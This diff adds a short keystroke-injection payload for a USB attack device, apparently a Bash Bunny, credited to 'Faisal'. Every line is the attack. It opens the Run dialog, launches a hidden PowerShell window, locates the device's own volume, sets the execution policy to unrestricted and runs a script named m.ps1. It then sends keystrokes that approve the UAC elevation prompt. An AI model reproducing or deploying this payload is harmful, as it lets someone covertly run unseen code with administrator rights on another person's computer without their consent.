@@ -1,0 +1,7 @@
+#Author: Faisal
+GUI r
+DELAY 600
+STRING powershell -windowstyle hidden "$u=gwmi Win32_Volume|?{$_.Label -eq'BASHBUNNY'}|select name;cd $u.name;set-executionpolicy unrestricted -force;./m.ps1"
+CTRL-SHIFT ENTER
+DELAY 3500
+ALT y
